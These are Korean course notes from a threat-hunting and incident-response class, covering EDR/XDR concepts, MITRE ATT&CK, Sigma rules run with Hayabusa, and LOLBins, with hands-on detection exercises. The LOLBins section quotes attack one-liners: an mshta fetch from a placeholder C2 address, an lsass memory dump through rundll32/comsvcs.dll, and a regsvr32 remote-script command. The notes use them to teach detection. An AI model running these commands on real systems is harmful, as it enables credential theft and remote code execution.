# [수업 노트] Security Gym — 위협 이벤트 분석(ATT&CK·D3FEND·YARA·Sysmon)

> 원본: 개인 학습 노트(Notion)에서 옮겨 정리. 스크린샷은 📷 표시로 화면 내용을 글로 옮겼습니다.

## 1Day

락시드,? 나토?

Sysmon

https://learn.microsoft.com/ko-kr/sysinternals/downloads/sysmon

- 실무에서는 edr server을 따로 만들어서 evtx를 모아서 커리 만들고 분석한다.
```plain text
S.G 침해사고 대응훈련 과정 소개 {
	한국인터넷진흥원의(KISA) 교육훈련프로그램 {
		|- KShield
		|- Security Gym (실전형 사이버훈련장)
			|- Incident Response Track (침해사고 대응)	<-- 여러분이 수강하시는 과정
				|- EDR 이벤트 로그 위협 사냥
				|- 사이버공격과 위협의 이해
				|- 악성코드 분석
				|- 실시간 공격 훈련
				|- 실시간 공격방어 훈련
				|- ...
			|- Security Solution Track (정보보호 제품군)
				|- Network Security Solution
				|- Endpoint Security Solution
				|- Live Fire Exercise (실시간 방어 훈련)
			|- Bug Hunting Track (버그헌팅)
			|- Seaport Security (선박항만 보안, 부산특화)
			..
	}

	실전형사이버훈련장 - 침해사고 대응 과정, 정보보호제품군 과정 {
		|- Incident Response Track (침해사고 대응)	<-- 여러분이 수강하시는 과정
			|- Live Fire Exercise (실시간 공격, 공격방어 훈련)
			|- Threrat Hunting (위협 사냥, 식별, 분류)
			|- Analysis (악성코드 분석)
			|- Proactive Defense (선제적 대응)

		|- Security Solution Track (정보보호 제품군)
			|- Network Security Solution
			|- Endpoint Security Solution
			|- Live Fire Exercise (실시간 방어 훈련)
	}
}
```
```plain text
+ 이론 - 과목의 개요와 내용 구성 {
	C0. 개요 {
		EDR 로그를 통해 확보한 단말의 이벤트, 패킷 트레이스를 대상으로한 이상징후 식별 방법을 다룸.
		이론+실습 형태의 교육.
	}

    C1. 이벤트 로그 분석을 통한 위협 식별 {
		- 이론. EDX(XDR) 보안솔루션의 등장 배경
		- 이론. MITRE ATT&CK 모델
        - 이론. 공격자 그룹의 위협 트랜드 변화와 LOTL(Living Off The Land)
		- 이론. 사이버 보안 분야에서 빈번히 사용되는 문법들
 		- 이론. 윈도우의 SYSMON의 개념과 활용
        - 이론. 공격자 그룹의 위협 트랜드 변화와 솔루션들 (MSHTA, CSC, WMIC, BITSADMIN, CERTUTIL, RUNDLL32)
        - 이론. 시그마 룰 개요 (등장 배경, 장점, 주요 문법구조, 룰을 사용하여 이벤트로그를 분석하는 도구들)
        - 실습. 시그마 룰 샘플 제작 실습
        - 이론. 스피어 피싱 이메일에 첨부된 파일의 형태와 관련 이벤트 (압축파일, 한컴 오피스, MS 오피스, PDF, LNK)
        - 실습. MUA에서 이메일에 첨부된 파일을 시스템에 저장하는 이벤트 식별
		- 실습. 다운로드된 악성 문서파일을 더블클릭하여 열람하는 이벤트 식별
        - 이론. 한컴 오피스의 포스트스크립트와 관련 프로세스 이벤트
        - 실습. 한컴 오피스 문서의 포스트스크립트 실행 이벤트 탐지
		- 이론. 악성 오피스 문서의 일반적인 구성요소
		- 이론. CFBF vs OOXML, HWP5.0 vs HWPML
		- 이론. 위협 사냥을 위해 알고 있어야 할 주요 LOLBins
        - 실습. LOLBins 실행 이벤트 식별
		- 이론. 프로세스의 이상징후 식별 방법
		- 실습. 프로세스의 이상징후 식별 실습
		- 이론. 프로세스 인젝션
		- 실습. 프로세스 인젝션 이벤트 탐지 실습
		- 실습. 다수의 시그마룰을 활용한 헌팅 실습 (시나리오 통합 분석)
		- 이론. 윈도우 실행파일의 이상징후 식별 방법
		- 이론. 제어지속 전술
		- 실습. 제어지속 - 레지스트리의 ASEP 수정 및 탐지 실습
	}

}
```
```plain text
이론. 전통적인 보안솔루션에서 EDX(XDR), MDR 에 이르기까지의 역사 {

	------------------------------------------------------------------------------------------------------------------------
				Network Interface (ethernet)  | Internet (IP) | Transfer (TCP) | Application (HTTP) | 페이로드 (BODY)
	------------------------------------------------------------------------------------------------------------------------
	NAC			|<------------------------------------------->|
	Firewall								  |<---------------------------->|
	WAF																		   |<---------------------------------->|
	IDS/IPS     							  |<------------------------------------------------------------------->|
	- "성곽방어용" -> FW, IPS, WAF
	- "단말 및 서버 방어용" -> EDR(Endpoint Detection & Response), XDR(eXtended Detection & Response)
	- "단말 및 서버 방어 + 위협 사냥 서비스" -> MDR(Managed Detection & Response)

	Q. NAC, FW, WAF, IDS/IPS, UTM 등의 전통적인 보안솔루션이 가진 한계는 무엇일까요?
	A. 기존 솔루션들은 네트워크에 대한 위협 탐지 및 차단역할을 충실히 수행하나 단말(Endpoint)의 위협에 대한 가시권 확보가 되지 않음.

	Q. EDR, XDR, MDR, SOAR 의 개념?
	A.
		EDR(Endpoint Detection and Response)
			윈도우, 리눅스, 맥OS 같은 단말의 이벤트를 수집하고 위협을 탐지하는데 사용하는 보안 솔루션
		XDR(Extended Detection and Response)
			EDR + 보안솔루션(WAF, IPS, NAC, FW ..)
		MDR(Managed Detection and Response)
			XDR + Threat Hunting 서비스
		SOAR(Security Orchestration, Automation and Response)
			발생한 위협에 대한 "자동화 대응"을 지원하는 솔루션

	Q. Threat Hunter (위협 사냥꾼)이 갖추어야 할 스킬은 어떤 것들이 있을까요?
	A.
		다양하겠으나 기존 CERT(Computer Emergency Response Team) 포지션의 스킬 뿐만이 아니라,
		대량의 데이터에 대한 가공, 가시화 능력 + "위협 이벤트"를 정의하고 적용할 수 있는 능력이 필요함
}
```

> 📷 강의 판서: 계층별 보안 장비 범위 — NAC는 이더넷~IP, 방화벽은 IP~TCP, IDS/IPS는 IP~HTTP, WAF는 HTTP 페이로드(BODY)까지 본다. 경계 방어는 FW·IPS·WAF, 단말·서버 방어는 EDR·XDR, 여기에 위협 헌팅 서비스를 더한 것이 MDR.

보안솔루션의 공통점은 네트워크 패킷을 본다.

osi7layer - 레퍼런스

tcp ip 4계층의 패킷을 주로 본다.

FIREWALL 방화벽 - 보안 소초, 검문소  - IP와 PORT만 본다

그래서 방화벽은 웹에플리케이션의 공격을 막지 못한다. HTTP HEAD, BODY에 공격 코드가 있다.

→WAF 가 생겨남, 방화벽이 못보는 것을 보완. 하지만 HEARTBREED OPENSSH취약점, 공격 페이로드를 보내면 메모리 크리덴셜을 SSH 로 빠져나감, WAF는 HTTP만 잘봄 , 방화벽은 포터를 사용해야하기 때문에 막지를 못함, 서비스 위의 영역에서의 공격을 막아야함. 룰을 만들면 웹패킹페이로드도 막음

IPS의 SCOPㄴ이 가장 넓다. 하지만 역활이 많으면 일을 하지 안듯이 통합시키면 퍼포먼스가 떨어짐. 그래서 분할 예) 락솔루션- 랜선을 꼽는 영역에서 - MAC address 와 mapping 정보

APT 표준 공격

파워쉘을 악성 코드로 죽일 수 없다.  - 기본 설치된 것이라서 ..

파워쉘을 이용해서 공격 - Git허브를 https 통신을 이용해서 공격가능 옆으로 이동 측면 공격

성곽 - 네트워크 보더에 솔루션을 붙여놓으면 내부를  방어할 수 없다. - edr 엔드포인트 등장 2013년 - 서버쪽에 실시간 수렴시킴

socanalysis -단말의 악성코드도 알아야함

단말의 위협을 탐지 - 파일의 생성과 process registary 탐지

업무 scope이 넓어짐 - 가시화를 통합해서 단말과 다른 보안 솔루션의 edr도 통합해서 모아보자

-  extended →xdr

xdr 운용 - 위협사냥꾼 threat hunter -식별 분류 탐지 - 데이터사이언스도 알아야한다. ,클러스터링과 도표화 -mdr→ 솔루션이 아니다. = 우리의 xdr을 설치하고 운용과 위협탐지솔루션을 주겠다.

방화벽에 ai가 붙지 않는 이유 - 안정성때문에

부모와 자식관계

-svchost

쿼리 로직
```plain text

	Q. EDR, XDR, MDR, SOAR 의 개념?
	A.
		EDR(Endpoint Detection and Response)
			윈도우, 리눅스, 맥OS 같은 단말의 이벤트를 수집하고 위협을 탐지하는데 사용하는 보안 솔루션
		XDR(Extended Detection and Response)
			EDR + 보안솔루션(WAF, IPS, NAC, FW ..)
		MDR(Managed Detection and Response)
			XDR + Threat Hunting 서비스

		SIEM(Security Information and Event Management)
			각종 서버, 보안솔루션, 단말, 네트워크 장비 등의 데이터 수집 및 분석
		SOAR(Security Orchestration, Automation and Response)
			발생한 위협에 대한 "자동화 대응"을 지원하는 솔루션

	Q. Threat Hunter (위협 사냥꾼)이 갖추어야 할 스킬은 어떤 것들이 있을까요?
	A.
		다양하겠으나 기존 CERT(Computer Emergency Response Team) 포지션의 스킬 뿐만이 아니라,
		대량의 데이터에 대한 가공, 가시화 능력 + "위협 이벤트"를 정의하고 적용할 수 있는 능력이 필요함
```

SIEM는 수집만한다.

XDR,EDR 은 대응을 한다.

SOAR 막는 작용이 없다. 이벤트를 가져와서 플레이북(SOAR가 행동할 것)을 만들어 가이드를 제공하면 조건에 따라서 XDRAGENT를 통해 지시해서 막는다.  - 기존 이벤트로그를 보고 플레이북을 만든다.

https://attack.mitre.org/

MITRE  마이트 미공공기관

CVE

ATT AND CK = 공격과 전술의 위키피디아

전술 TACTIC- 공격자 그룹이 공격 성공을 위해 필요한 하나의 단기 목표

TECHNIC

> 📷 MITRE ATT&CK Enterprise 매트릭스 상단: 14개 전술(Reconnaissance~Impact)과 전술별 기법 수. Defense Evasion 47개로 가장 많고 Discovery 34, Persistence 23 순.

WHAT - tatic Reconnaissance ,inital access

> 📷 ATT&CK 매트릭스 기법 목록 일부: Reconnaissance(Active Scanning, Phishing for Information 등), Initial Access(Drive-by Compromise, Exploit Public-Facing Application, Phishing, Valid Accounts 등)부터 Impact(Data Destruction, Data Encrypted for Impact, Service Stop 등)까지.

HOW -  techniques - Spearphishing Attachment

techniques 의 하위 구조 - Procedure   - 구체적인 대상, 방법

tatic이 파악하기 더 어렵다. 맥략을 알아야한다.

침해사고 분석 보고서

TTP

mitre evaluation

https://d3fend.mitre.org/

> 📷 MITRE D3FEND(방어 기법 지식 그래프) Detect 영역. Process Analysis 아래 'Process Lineage Analysis'(프로세스 계보 분석)를 표시해 둠 — 부모·자식 프로세스 관계로 이상 실행을 탐지하는 방어 기법.

계산기 프로그램의 부모가 CVS나 EXPLOER가 아닌 것을 찾아봐- BUILT IN PROCESS를 공부해야 커리를 만들수 있다.
```plain text
+ 이론. 사이버 보안 분야에서 빈번히 사용되는 규칙들 {
							[조사대상]		[목적]
	YARA Rule				파일				악성파일 탐지, 그룹화
	SNORT(SURICATA) Rule	네트워크패킷		네트워크 기반의 위협 탐지 / 차단
	SIGMA Rule				단말이벤트		위협식별(Hunting)

	참조. YARA룰 예시와 정의 -> https://virustotal.github.io/yara/

	참조.
		공격자를 추적할 때 TTPs를 기반으로 하는 것이 좋습니다. (공격자가 회피할 가능성이 낮습니다. Pain of Pyramid)
		SIGMA 룰은 TTPs를 기반으로 하는 위협 이벤트를 정의하고 추적하는데 사용되며 오늘날 많은 보안 솔루션들이 사용합니다.
}
```

YARA https://virustotal.github.io/yara/

YARA is a tool aimed at (but not limited to) helping malware researchers to identify and classify malware samples 악성코드를 분류하고 식별해주는 툴 - 분석은 못하고 패턴만 준다.

> 📷 YARA 룰 예시(silent_banker): meta(설명·위협 등급), strings에 16진 바이트 패턴 $a·$b와 문자열 $c를 정의하고, condition `$a or $b or $c`로 하나라도 일치하면 탐지.

SIGMA RULE은 위협을 탐지할 때 사용할 수 있는 문법, 정책

시그마 룰을 분석해주는 도구  HAYABUSA

> 📷 Security Gym 실습 VM의 E:\DFIR\hayabusa 폴더(art, config, logs, rules, hayabusa.exe). Hayabusa는 윈도우 이벤트 로그를 Sigma 룰로 분석하는 도구.
```plain text
실습. 시그마 룰 샘플 제작 실습 {
	# 미션: 단말 내에서 "notepad++" 이 실행된 흔적을 찾으세요. (횟수, 시간, 경로 등)

    STEP1. NOTEPAD++ 프로그램을 이용하여 편집 작업을 수행 합니다.
    STEP2. 예제 시그마 룰을 다음과 같이 제작 합니다.
	--- E:\DFIR\hayabusa\myrules\CreateProcess_notepad.yml -------------------------------------------------------------------------------------
	title: First Sigma Rule         # 탐지하고자 하는 행위를 나타낼 수 있는 타이틀을 기재
	id:                             # 룰을 식별/참조하기 위한 UUID
	author: hijoo                   # 작성자 별칭 및 연락처 기재(룰에 대한 토론을 위함)
	date:
	description: Any
	status: experimental            # rule의 상태를 표시(test, experimental은 추후 수정 예정이라는 사실을 표기 하기 위함)
	tag: MITRE_ATT&CK-DEFENSE_EVASION-T.1197              # 일반적으로 해당 rule이 포함하고 있는 공격 기술(mitre attack)

	logsource:
	  product: windows              # sigma rule이 적용되는 제품
	  category: process_creation

	detection:
	  selection:                    # 조건을 정의, 이름을 변경 후 사용가능
		EventID: 4688                  # Process Create
	  filter:                       # 필터링할 규칙, 이름을 변경 후 사용가능
		CommandLine|contains:
		 - '\notepad++.exe'      # "CommandLine"의 경우 윈도우에서 기본 옵션이 아니며 설정해 줘야 함
	  condition: selection and filter   # 이벤트 ID 4688(프로세스 생성) + notepad++.exe 프로세스 생성

	level: low
	-------------------------------------------------------------------------------------------------------------

    STEP3. 현재 시스템의 "security.evtx" 파일을 가져옵니다. (C:\Windows\System32\winevt\Logs\Security.evtx)
    STEP4. 다음과 같은 명령을 통해 프로세스 생성 이벤트를 조사 합니다.
        C:> hayabusa csv-timeline -r .\myrules -d .\myevents -C -o result.csv
    STEP5. OpenOffice or Timeline Explorer 도구를 이용하여 앞서 아웃풋된 CSV 파일을 열람 합니다. "notepad++.exe" 프로그램의 실행 시간과 열람한 파일을 확인할 수 있습니다.
		# 앞서 실행했던 notepad++ 프로그램의 정보를 확인할 수 있습니다.
}
```
```plain text
title: First Sigma Rule         # 탐지하고자 하는 행위를 나타낼 수 있는 타이틀을 기재
	id:                             # 룰을 식별/참조하기 위한 UUID
	author: hijoo                   # 작성자 별칭 및 연락처 기재(룰에 대한 토론을 위함)
	date:
	description: Any
	status: experimental            # rule의 상태를 표시(test, experimental은 추후 수정 예정이라는 사실을 표기 하기 위함)
	tag: MITRE_ATT&CK-DEFENSE_EVASION-T.1197              # 일반적으로 해당 rule이 포함하고 있는 공격 기술(mitre attack)

	logsource:
	  product: windows              # sigma rule이 적용되는 제품
	  category: process_creation

	detection:
	  selection:                    # 조건을 정의, 이름을 변경 후 사용가능
		EventID: 4688                  # Process Create
	  filter:                       # 필터링할 규칙, 이름을 변경 후 사용가능
		CommandLine|contains:
		 - '\notepad++.exe'      # "CommandLine"의 경우 윈도우에서 기본 옵션이 아니며 설정해 줘야 함
	  condition: selection and filter   # 이벤트 ID 4688(프로세스 생성) + notepad++.exe 프로세스 생성

	level: low
```
```plain text
이론. 시그마 룰 개요 {
	- 교재 P95~ 참조
	- 룰 작성시 주의사항
		들여쓰기 Tab 사용 불가.
		공백 문자로 Depth 지정하는 것을 권장.
		':'은 붙여서 사용하며	값은 한칸 공백 후 기재. -> "category: Process_Creation"
		대소문자 주의 -> Commandline(X) -> CommandLine(O)
	참조사항: https://www.uuidgenerator.net/
}

+ 실습. 시그마 룰 샘플 제작 실습 {
	# 미션: 단말 내에서 "notepad++" 이 실행된 흔적을 찾으세요. (횟수, 시간, 경로 등)

    STEP1. NOTEPAD++ 프로그램을 이용하여 편집 작업을 수행 합니다.
    STEP2. 예제 시그마 룰을 다음과 같이 제작 합니다.
	--- E:\DFIR\hayabusa\myrules\CreateProcess_notepad.yml -------------------------------------------------------------------------------------
	title: First Sigma Rule         # 탐지하고자 하는 행위를 나타낼 수 있는 타이틀을 기재
	id:                             # 룰을 식별/참조하기 위한 UUID
	author: hijoo                   # 작성자 별칭 및 연락처 기재(룰에 대한 토론을 위함)
	date:
	description: Any
	status: experimental            # rule의 상태를 표시(test, experimental은 추후 수정 예정이라는 사실을 표기 하기 위함)
	tag: MITRE_ATT&CK-DEFENSE_EVASION-T.1197              # 일반적으로 해당 rule이 포함하고 있는 공격 기술(mitre attack)

	logsource:
	  product: windows              # sigma rule이 적용되는 제품
	  category: process_creation

	detection:
	  selection:                    # 조건을 정의, 이름을 변경 후 사용가능
		EventID: 4688                  # Process Create
	  filter:                       # 필터링할 규칙, 이름을 변경 후 사용가능
		CommandLine|contains:
		 - '\notepad++.exe'      # "CommandLine"의 경우 윈도우에서 기본 옵션이 아니며 설정해 줘야 함
	  condition: selection and filter   # 이벤트 ID 4688(프로세스 생성) + notepad++.exe 프로세스 생성

	level: low
	-------------------------------------------------------------------------------------------------------------

    STEP3. 현재 시스템의 "security.evtx" 파일을 가져옵니다. (C:\Windows\System32\winevt\Logs\Security.evtx)
    STEP4. 다음과 같은 명령을 통해 프로세스 생성 이벤트를 조사 합니다.
        C:> hayabusa csv-timeline -r .\myrules -d .\myevents -C -o result.csv
    STEP5. OpenOffice or Timeline Explorer 도구를 이용하여 앞서 아웃풋된 CSV 파일을 열람 합니다. "notepad++.exe" 프로그램의 실행 시간과 열람한 파일을 확인할 수 있습니다.
		# 앞서 실행했던 notepad++ 프로그램의 정보를 확인할 수 있습니다.
}

+ 교육생실습. 시그마 룰 샘플 제작 실습 {
	# 미션: 다음 두 개의 룰 파일을 생성한 후 앞서 확보한 "Security.evtx" 파일 내에서 흔적을 찾아 보세요.
	## "notepad++" 프로그램이 실행된 흔적을 찾는 룰 (createprocess_notepad.yml)
	## "cmd" 프로그램이 실행된 흔적을 찾는 룰 (createprocess_cmd.yml)
	## Hayabusa 툴을 이용하여 헌팅을 하신 후 도출된 CSV 파일은 TimelineExplorer를 통해 열람하세요.
	## "Rule Title" 필드를 기준으로 group 작업을 하세요.

	Q. notepad.exe 프로그램은 해당 단말에서 언제, 몇번 실행되었나요?
	Q. cmd.exe 프로그램은 해당 단말에서 언제, 몇번 실행되었나요?
		실행횟수: 강사 환경의 경우 cmd.exe 프로세스는 총 16번 실행 되었습니다.
		실행시간: 총 4일에 걸쳐서(2025.1.17, 1.19, 1.20, 1.21) 실행 되었습니다.
		실행경로: 모든 cmd.exe 프로그램은 C:\Windows\System32\cmd.exe 에서 실행 되었습니다.
}

```
```plain text
이론. 파일리스 공격과 LoTL(Living of The Land) {
	- LOL(Living off the land), LOLBins
	- LOL은 공격대상 시스템에 기본 설치된 바이너리, 설정파일 등을 이용한 공격전개 방식을 의미한다.
	- 공격자가 LOTL 전략을 취하게된 주된 이유는 "Defense Evasion" 이다.
	- LOTL을 위해 악용하는 기존 설치된 바이너리 실행파일들을 LOLBins 라고 한다.

	자가진단!!
	Q. 공격자가 파일리스 공격, LOL 기조를 가지게된 배경은 무엇일까요?
}
```

인증서 - 크리덴셜이랑 해시값이 존재

신뢰하지 않은 인증서 - 셀프사인되거나 ms 인증서아님

uac 윈도우7

백신과 인증서 이기고 공격하기 위해서 - LoTL(Living of The Land)

LOLBins - 실행파일들

파워쉘을 실행시키는 매크로를 엑셀로 실행시키면… git 서버로가서 ps1를 https통신을 해서 파일을 가져와서 파워쉘로 복호를 해서 프로그램을 실행시키면 깃에있는 악성페이로드를  파워쉘이 악성코드를 “프로세스 인젝션”을 정상적인 프로세스에 한다.

registry에 악성파워쉘스크립트를 숨겨 놓는다.

c2통신 을 통해 악성행위를 한다.

waf는 악성 판단이 어려움

mshta,exe 를 실행시킬 수 있다.

다음에는 파워쉘은 꺼지고  인젝션된 프로그램에서 계속 악성 코드가 작용한다.

그걸 잡기 위해 시그마룰에 부모프로세스가 파워쉘인 것을 잡으면 된다.

lolbin은 파워쉘과 mshta,exe

https://lolbas-project.github.io/

> 📷 LOLBAS 프로젝트의 regsvr32 항목: `regsvr32 /s /n /u /i:<원격 .sct URL> scrobj.dll`로 원격 SCT 스크립트를 실행(정상 윈도우 바이너리를 악용하는 Squiblydoo 기법).

/regsrv32.exe 백도어

/s 는 조용히 백그라운드 사용

/u 서비스를 등록안하고

/i

dll는 서비스 파일 scrip object 비쥬얼베이직 스크립터를 윈도우에서 실행가능 dll안에 인터프리트가 있다.

vb스크립트에 원격으로 소스를 가져옴

폭싱실행

https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90001
```plain text
STEP1. 예제 시그마 룰을 다음과 같이 제작 합니다.
	--- SaveOfficeDocFromMUA.yml -------------------------------------------------------------------------------------
	title: SaveOfficeDocFromMUA
	id:
	author: hijoo
	date:
	description: Any
	status: experimental
	tag: MITRE_ATT&CK-INITIAL_ACCESS-T1566.001

	logsource:
	  product: windows
	  service: sysmon

	detection:
	  FileCreationEvent:
		EventID: 11		# FileCreate
	  MUAProcess:
		Image|contains:
		  - outlook.exe
		  - chrome.exe
	  FileExtension:
	    TargetFilename|endswith:
		  - '.hwpx'
		  - '.hwp'
		  - '.pdf'
		  - '.docx'
		  - '.doc'
		  - '.xlsx'
		  - '.xls'
	  condition:
	    FileCreationEvent and MUAProcess and FileExtension	# OUTLOOK.EXE MUA를 통해 다운로드(파일생성)된 이벤트들만 확인할 수 있습니다.
	level: low
	-------------------------------------------------------------------------------------------------------------
    STEP2. 다음과 같은 명령을 통해 프로세스 생성 이벤트를 조사 합니다.
        C:> hayabusa csv-timeline -r .\myrules -d .\myevents -C -o result.csv
    STEP3. OpenOffice or Timeline Explorer 도구를 이용하여 앞서 아웃풋된 CSV 파일을 열람 합니다.

}
```
```plain text
STEP2. 다음과 같은 명령을 통해 프로세스 생성 이벤트를 조사 합니다.
        C:> hayabusa csv-timeline -r .\myrules -d .\myevents -C -o result.csv
    STEP3. OpenOffice or Timeline Explorer 도구를 이용하여 앞서 아웃풋된 CSV 파일을 열람 합니다.

}
```
```plain text
 실습. 한컴오피스 문서파일을 더블클릭하여 열람하는 이벤트 식별 {
	미션:
		조건1. 한컴오피스 프로그램을(hwp.exe) 이용하여 기존 다운로드된 파일을 실행하는 경우
		조건2. 열람하는 파일의 확장자는 ".hwp" 혹은 ".hwpx"
		조건3. 다른 프로그램이 아닌 사용자의 더블클릭 혹은 열기를 통해 실행되어야 함 (부모프로세스가 explorer.exe)

	질문:
		Q. 사용자가 탐색기를 통해 직접 한컴 오피스 문서를 열람한 PC 이름은 무엇입니까?
		A. DESKTOP-9SCSJHC

		Q. 사용자가 탐색기를 통해 직접 열람한 한컴 오피스 문서의 개수, 열람시각, 경로는 무엇입니까?

		IDX	Timestamp	Description
		-------------------------------------------------------------------------------
		  2021.11.08
		1	15:11:08	C:\Users\user03\Downloads\채용요청서.hwp
		  2021.11.09
		2	12:05:59	C:\Users\user03\Desktop\~생략~평균임금_공표_20201127.hwp
		  2021.11.10
		3	15:36:39	C:\Users\user03\Downloads\[개발팀]채용요청서.hwp
		  2021.11.11
		4	13:01:06	C:\Users\user03\Downloads\StandardLaborContract.hwp
		-------------------------------------------------------------------------------

	STEP1. 예제 시그마 룰을 다음과 같이 제작 합니다.
        --- OpenHanComOfficeDoc.yml -------------------------------------------------------------------------------------
        title: OpenHanComOfficeDoc
        id:
        author:
        date: 2025/12/17
        description: Any
        status: experimental
        tag: MITRE_ATT&CK-INITIAL_ACCESS-T1566.001

        logsource:
          product: windows
          service: sysmon

        detection:
          selection:
            EventID: 1		# ProcessCreation
			ParentImage|contains: explorer.exe
			Image|contains: hwp.exe
			CommandLine|contains:
			 - '.hwp'
			 - '.hwpx'
		  condition: selection
		level: low
        -------------------------------------------------------------------------------------------------------------
    STEP2. 다음과 같은 명령을 통해 프로세스 생성 이벤트를 조사 합니다.
        C:> hayabusa csv-timeline -r .\myrules -d .\myevents -C -o result.csv
    STEP3. OpenOffice 도구를 이용하여 앞서 아웃풋된 CSV 파일을 열람 합니다.
}
```

운영체제에 있는 프로세스는 부모를 넘을 수 없고 프로세스 간에 권한 계층이 필요하다.

웹쉘을 올리면 원격으로 조절… 스크립트가 실행이되면 실행의 주체는 아파치서버이다.

아파치서버 아파치서버의 데몬은 관리자로 실행하고나 아파치계정으로 실행하면 부모를 넘을 수 없다.

etc/password 파일은 644 퍼미션 etc/shadow파일은 600

두 파일의 소유자 그룹은 관리자이지만 패스워드는 볼 수 있지만 쉐도우파일은 볼수 없다 아파치 서버는 others에 해당이 되므로 같은 파워쉘도 등급에 따라 할 수 있는 것이 정해져있다.

원격프로세스의쉘을 따도 그것의 등급이 중요하다.

system32는 관리자등급만 가능하므로 파워쉘아님

하드닝이 중요하다, 공격자를 묶어 포기하고 탐지할 수 있게 해준다.

DWELL Time 중요한 용어 annual report 낮을 수록 좋다 많으면 공격자가 활동을 많이했음을 의미 쉘을 박아놓고 걸려서 제거하는 시간을 의미. 0일수가 없다. 완벽한 공격을 막을 수는 없지만 빨리 제거가능


## 2Day
```plain text
+ 이론. 위협 사냥을 위해 알고 있어야 할 주요 LOLBins {
	# LOLBins를 활용한 공격 예시 참조 -> https://lolbas-project.github.io/

	- MSHTA.EXE - MSHTA.EXE XXX.HTML (실행법)
		# HTA(HTML Application)을 실행하는데 사용하는 윈도우 유틸리티.
		# HTA는 윈도우에서만 사용하는 일종의 실행 파일 포맷.
		# HTML코드와 Javascript를 이용하여 프로그램을 구현.
		# HTA를 지원하는 웹브라우저나 mshta.exe를 이용하여 HTA를 실행.
		# 90년대에 잠깐 사용되었던 것으로 오늘날에는 거의 사용되지 않음.
		# legacy 시스템과의 호환성을 위해 mshta.exe는 여전히 윈도우에 기본적으로 설치됨.
		# 공격자들은 mshta.exe를 이용해서 악성 HTA 파일을 다운로드 받아 실행하는 방식으로 사용.
		# 예시) 악성 MS-word 문서를 오픈 → DDE 커맨드를 이용해서 “mshta.exe http://C2주소/mal.hta” 같은 형태로 명령어를 실행함.
		# mshta.exe는 정상적인 경우 거의 사용되지 않기 때문에, 실행된 것 자체를 위협으로 인지하는 것이 바람직
	- CSC.EXE
		# NET Framework와 함께 설치되는 C# 컴파일러
		# 공격자들은 C#으로 구현된 소스코드를 PC등으로 업로드한 후 csc.exe를 이용하여 컴파일하고 실행
	- WMIC.EXE
		# WMI(Windows Management Instrumentation) 커맨드라인 클라이언트
		# lateral movement, persistence, collection 등 거의 모든 전술 영역에서 다양하게 이용됨
	- BITSADMIN.EXE
		# BITS 관리도구
		# 공격자들은 bitsadmin.exe를 활용하여 파일을 다운로드하거나 defense evasion 목적으로 proxy execution 수행
	- CERTUTIL.EXE
		# 인증서 관리도구
		# 공격자들은 이 유틸리티를 활용하여 인코딩/디코딩, 파일다운로드, ADS에 파일 은닉 등을 수행
	- RUNDLL32.EXE
		# dll에 구현된 함수를 호출하는데 사용되는 유틸리티 (DLL 실행에 사용되는 도구)
		# 정상적인 경우에도 많이 사용됨 (주로 어떤 프로세스가 rundll32.exe를 호출하는 형태로 사용)
		# 공격자들은 rundll32.exe를 대상으로 프로세스 인젝션을 수행하거나, rundll32.exe를 이용하여 윈도우가 제공하는 정상적인 DLL의 함수를 실행하여 악성행위를 수행
		# 예시) rundll32.exe comsvcs.dll, minidump <lsass.exe 프로세스 ID> lsass.dump
        #     => comsvcs.dll(정상적인 DLL)의 minidump 함수를 호출하여 lsass.exe 프로세스의 메모리를 덤프
        #     => credential dumping이 목적이다.
	- WSCRIPT.EXE (윈도우스크립트 실행)
	- POWERSHELL.EXE
	- CMD.EXE

	참조할곳: https://lolbas-project.github.io/
}
```

rundll은 정상적이 프로세스이지만 악성코드를 실행

정상적인 프로세스가 악성 dll을 메모리에 로더함

lolbins을 시그마룰에 넣으면 다양한 작용을 할 수 있다.

헌팅방법을 문장으로 정리해 둔 후..

교재 p110
```plain text
+ 이론. 한컴 오피스의 포스트스크립트와 관련 프로세스 이벤트 {
	# 교재 110페이지 참조

	Q. 한컴오피스는 고스트스크립트 모듈을 어떠한 목적으로 사용하였을까요?
	Q. 포스트스크립트와 고스트스크립트의 관계는?

	Q. GBB.EXE, GSWIN32.EXE, GSWIN64.EXE 프로그램의 역할은 무엇이며 프로세스 연관관계는 어떻게 됩니까?
	A.
		GBB.EXE 프로그램은 문서파일에 임베드된 포스트스크립트 파일의 경로를 임시 폴더에 옮기는 역할을 한다.
		GSWIN.EXE 프로그램은 포스트스크립트 파일을 실행하는 역할을 한다.
}
```
```plain text
 이론. 악성 오피스 문서의 일반적인 구성요소 {
	익스플로잇: 소프트웨어의 비정상 동작을 유발하는 데이터 혹은 코드
	악성파일(SWF, PE 파일 등): 악성문서 내에 임베드 되어 있으며 악성문서 열람 과정에서 실행되는 파일들
	쉘코드: 취약한 소프트웨어의 메모리 공간에 삽입되어 실행되는 기계어코드 루틴
	스크립트(VB 스크립트, 포스트스크립트, 자바스크립트 등): 오피스 프로그램(혹은 플러그인 프로그램)에 의해 실행되는 스크립트
}
```

### 악성코드란

- Exploit

1. 익스플로잇(Exploit)의 정의

소프트웨어나 하드웨어의 버그, 혹은 설계상의 취약점(Vulnerability)을 이용해 공격자가 의도한 동작을 수행하도록 만드는 코드나 기술입니다.

• 취약점: 건물에 난 구멍 (약점)

• 익스플로잇: 그 구멍을 통과하기 위해 사용하는 사다리나 도구 (공격 수단)

2. 주요 공격 목적

공격자가 익스플로잇을 사용하는 이유는 다양하지만, 대개 다음 세 가지 단계로 이어집니다.

• 권한 상승: 일반 사용자 계정에서 관리자(Root) 권한을 탈취.

• 데이터 유출: 데이터베이스에 접근해 민감 정보를 빼냄.

• 원격 코드 실행(RCE): 멀리 떨어진 곳에서 대상 컴퓨터에 악성 프로그램을 설치하거나 조종.

3. 익스플로잇의 종류종류설명제로 데이 (Zero-day)개발자도 모르는 취약점을 공격. 패치가 없기 때문에 방어가 매우 어려움.로컬 (Local)이미 시스템에 접속한 상태에서 권한을 높이기 위해 사용.리모트 (Remote)네트워크를 통해 외부에서 대상 시스템을 공격.

exploit의 형태와 동작은 여러가지가 있다.

- 쉘코드

exploit이 쉘코드에 잘못된 코드를 넣는 역활, 취약한 논리가 나오게 된다.

취약한 프로그램이 exploit에 공격을 당했고 쉘코드가 실행되게 했다.

- script
- 실행파일
```plain text
+ 실습. 한컴 오피스 문서의 포스트스크립트 실행 이벤트 탐지 {
 	미션:
